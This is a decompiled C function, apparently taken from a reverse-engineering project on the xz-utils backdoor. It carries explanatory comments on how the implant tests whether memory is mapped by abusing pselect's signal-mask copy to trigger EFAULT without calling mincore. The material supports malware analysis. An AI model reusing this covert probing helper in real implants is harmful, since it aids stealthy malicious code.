// /home/kali/xzre-ghidra/xzregh/102370_is_range_mapped_via_pselect.c
// Function: is_range_mapped_via_pselect @ 0x102370
// Calling convention: __stdcall
// Prototype: BOOL __stdcall is_range_mapped_via_pselect(u8 * addr, u64 length, global_context_t * ctx)


/*
 * AutoDoc: User-space range probe that avoids `mincore(2)`. The helper rejects zero-length requests and addresses below 0x01000000, then requires `ctx->libc_imports` to expose `pselect` plus `__errno_location`. Starting from the page-aligned base it repeatedly points `pselect`'s `sigmask` argument at the address being tested while passing NULL fd sets; the kernel copies the `sigset_t`, so an unmapped byte causes `EFAULT`. The cursor advances in 0x200-byte steps until it covers `[addr, addr+length)`, clearing errno and returning FALSE on the first fault. Successful sweeps report TRUE so callers know the buffer is safe to dereference.
 */

#include "xzre_types.h"

BOOL is_range_mapped_via_pselect(u8 *addr,u64 length,global_context_t *ctx)

{
  libc_imports_t *libc_imports;
  BOOL range_is_mapped;
  int pselect_result;
  int *errno_ptr;
  u8 *probe_cursor;
  long timeout_seconds;
  long timeout_nanoseconds;
  
  if (length == 0) {
    return FALSE;
  }
  // AutoDoc: Avoid probing NULL/vsyscall/etc.—the helpers never touch addresses below 16 MB.
  if (addr < (u8 *)0x1000000) {
LAB_00102393:
    range_is_mapped = FALSE;
  }
  else {
    probe_cursor = (sigset_t *)((ulong)addr & 0xfffffffffffff000);
    if (probe_cursor < addr + length) {
      if (ctx == (global_context_t *)0x0) goto LAB_00102393;
      do {
        timeout_seconds = 0;
        // AutoDoc: Every iteration insists that both `pselect` and `__errno_location` are exported before attempting the probe.
        libc_imports = ctx->libc_imports;
        if (((libc_imports == (libc_imports_t *)0x0) ||
            (libc_imports->__errno_location == (pfn___errno_location_t)0x0)) ||
           (libc_imports->pselect == (pfn_pselect_t)0x0)) goto LAB_00102393;
        timeout_nanoseconds = 1;
        // AutoDoc: Abuse `pselect`'s signal-mask copy: the kernel will touch `probe_cursor`, which faults if the range is unmapped.
        pselect_result = (*libc_imports->pselect)(1,(fd_set *)0x0,(fd_set *)0x0,(fd_set *)0x0,(timespec *)&timeout_seconds
                                   ,probe_cursor);
        // AutoDoc: Treat `EFAULT` (or a NULL probe pointer) as "unmapped", clear errno, and bail out immediately.
        if ((pselect_result < 0) &&
           ((errno_ptr = (*ctx->libc_imports->__errno_location)(), *errno_ptr == 0xe ||
            (probe_cursor == (sigset_t *)0x0)))) {
          *errno_ptr = 0;
          goto LAB_00102393;
        }
        probe_cursor = probe_cursor + 0x200;
      } while (probe_cursor < addr + length);
    }
    range_is_mapped = TRUE;
  }
  return range_is_mapped;
}

